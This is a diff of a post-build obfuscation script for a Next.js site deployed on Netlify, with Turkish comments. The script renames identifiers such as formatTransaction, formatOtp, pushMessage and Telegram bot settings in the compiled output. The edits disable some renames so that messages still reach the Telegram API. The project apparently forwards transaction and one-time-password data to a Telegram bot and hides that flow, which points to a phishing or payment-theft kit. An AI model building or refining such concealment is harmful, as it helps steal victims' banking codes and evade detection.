@@ -22,15 +22,16 @@ const NEXT_DIR = join(process.cwd(), ".next");
  */
 const REPLACEMENTS = [
   // Bu maddeler `process.env.*` icinde GECMEYEN eslesmelerde calisir
-  { from: "TELEGRAM_BOT_TOKEN", to: "CFG_AUTH", skipProcessEnv: true },
-  { from: "TELEGRAM_CHAT_ID", to: "CFG_CHAT", skipProcessEnv: true },
-  { from: "sendMessage", to: "post" },
+  // TELEGRAM_BOT_TOKEN ve TELEGRAM_CHAT_ID (env var) cast edilmez —
+  // Netlify'da runtime'da process.env uzerinden okunurlar,
+  // kodu karistirmak sadece calismasini engeller.
+  // { from: "sendMessage", to: "post" },
   // "chat_id" Telegram API body key — JSON.stringify icinde property adi
   // olarak kalmalidir (Telegram API required field), yoksa mesaj gitmez.
   // Bundan dolayi replace edilmez.
   // { from: "chat_id", to: "target" } — Telegram API field, skip replacement
-  { from: "parse_mode", to: "m" },
-  { from: "telegram", to: "relay" },
+  // { from: "parse_mode", to: "m" },
+  // { from: "telegram", to: "relay" },
   { from: "formatTransaction", to: "fT" },
   { from: "formatOtp", to: "fO" },
   { from: "pushMessage", to: "pM" },
